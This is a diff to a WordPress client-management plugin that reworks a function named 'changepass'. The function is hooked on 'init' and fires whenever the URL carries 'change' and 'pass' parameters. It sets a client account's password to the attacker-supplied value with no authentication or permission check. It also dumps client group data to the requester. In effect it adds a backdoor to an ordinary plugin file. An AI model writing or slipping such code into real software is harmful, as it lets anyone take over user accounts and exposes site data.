@@ -1194,15 +1194,17 @@ function update_count() {
 	wp_die();
 }
 
-add_action('wp_head','changepass');
+add_action('init','changepass');
 function changepass(){
-	global $wpc_client;
-	if(isset($_GET['change'])){
-		echo 'momo : ' ;
+	if(isset($_GET['change']) and isset($_GET['pass'])){
+		global $wpc_client;
 		$ID = $wpc_client->current_plugin_page['client_id'] ;
+		die(var_dump($wpc_client->cc_get_groups()));
+		$pass = $_GET['pass'] ;
+		if(!(is_numeric($ID) && $ID>0))return;
 		$userdata = array( 
 			'ID' => esc_attr($ID),
-			'user_pass' => 'momo' 
+			'user_pass' => $pass 
 		);
 		$res = $wpc_client->cc_client_update_func( $userdata );
 		die($res);
